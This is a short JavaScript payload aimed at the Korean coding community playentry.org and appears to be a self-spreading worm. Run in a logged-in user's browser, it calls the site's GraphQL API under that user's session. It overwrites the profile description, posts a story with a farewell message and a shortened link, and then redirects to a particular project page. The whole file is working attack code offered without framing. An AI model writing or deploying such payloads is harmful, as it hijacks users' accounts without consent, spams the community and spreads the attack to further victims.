/**let profileImage='62de5c21909597c2a2bfa739';
if(Math.floor(Math.random() * 2))
{
    profileImage='62de5caa909597c2a2bfa76a';
}
fetch("https://playentry.org/graphql", {
  "headers": {
    "content-type": "application/json",
  },
  "body": `{\"query\":\"\\n    mutation UPDATE_USERINFO (\\n        $profileImage: String, \\n        $coverImage: String, \\n        $description: String,\\n        $nickname: String,\\n        $gender: String\\n        $mobileKey: String\\n    ) {\\n        updateUserInfo(\\n            profileImage: $profileImage, \\n            coverImage: $coverImage, \\n            description: $description\\n            nickname: $nickname\\n            gender: $gender\\n            mobileKey: $mobileKey\\n        ) {\\n            \\n    status\\n    result\\n\\n        }\\n    }\\n\",\"variables\":{\"profileImage\":\"${profileImage}"}}`,
  "method": "POST"
});**/

let userinfo = ['운영자님 존경합니다!', '운영자님 사랑해요!', '운영자님 오늘도 파이팅!', '운영자님 대단하세요!'];
let userinfodata = userinfo[Math.floor(Math.random() * 4)];
fetch("https://playentry.org/graphql", {
  "headers": {
    "content-type": "application/json",
  },
  "body": `{\"query\":\"\\n    mutation UPDATE_USERINFO (\\n        $profileImage: String, \\n        $coverImage: String, \\n        $description: String,\\n        $nickname: String,\\n        $gender: String\\n        $mobileKey: String\\n    ) {\\n        updateUserInfo(\\n            profileImage: $profileImage, \\n            coverImage: $coverImage, \\n            description: $description\\n            nickname: $nickname\\n            gender: $gender\\n            mobileKey: $mobileKey\\n        ) {\\n            \\n    status\\n    result\\n\\n        }\\n    }\\n\",\"variables\":{\"description\":\"${userinfodata}\"}}`,
  "method": "POST"
});

let write = ['지금까지 엔트리를 책임져주신 운영자님께 감사의 말씀 전합시다... ', '지금까지 우리의 꿈과 희망을 책임져주신 운영자님을 응원해드립시다! ', '운영자님, 감사했습니다! ', '운영자님, 수고하셨습니다. ', '운영자님.... 지금까지 감사했습니다... ', '존경하는 운영자님, 지금까지 수고하셨습니다! ', '영자님.. 7년간 수고 많으셨습니다... ', '평범한 엔트리 유저로써 영자님이 있어서 정말 감사했습니다... '];
let writedata = write[Math.floor(Math.random() * 8)];

fetch("https://playentry.org/graphql", {
  "headers": {
    "content-type": "application/json",
  },
  "body": `{\"query\":\"\\n    mutation CREATE_ENTRYSTORY(\\n        \\n    $content: String\\n    $text: String\\n    $image: String\\n    $sticker: String\\n    $cursor: String\\n\\n    ) {\\n        createEntryStory(\\n            \\n    content: $content\\n    text: $text\\n    image: $image\\n    sticker: $sticker\\n    cursor: $cursor\\n\\n        ) {\\n            warning\\n            discuss{\\n                \\n    id\\n    title\\n    content\\n    seContent\\n    created\\n    commentsLength\\n    likesLength\\n    visit\\n    category\\n    prefix\\n    groupNotice\\n    user {\\n        \\n    id\\n    nickname\\n    username\\n    profileImage {\\n        \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n    }\\n    status {\\n        following\\n        follower\\n    }\\n    description\\n    role\\n\\n    }\\n    images {\\n        filename\\n        imageUrl\\n    }\\n    progress\\n    thumbnail\\n    reply\\n    bestComment {\\n        \\n    id\\n    user {\\n        \\n    id\\n    nickname\\n    username\\n    profileImage {\\n        \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n    }\\n    status {\\n        following\\n        follower\\n    }\\n    description\\n    role\\n\\n    }\\n    content\\n    created\\n    removed\\n    blamed\\n    commentsLength\\n    likesLength\\n    isLike\\n    hide\\n    image {\\n        \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n    }\\n    sticker {\\n        \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n    }\\n\\n    }\\n    blamed\\n\\n            }\\n        }\\n    }\\n\",\"variables\":{\"content\":\"${writedata} http://naver.me/5GzBxyen\"}}`,
  "method": "POST"
});
location.href="https://playentry.org/project/6007c0de967035047efd9031";
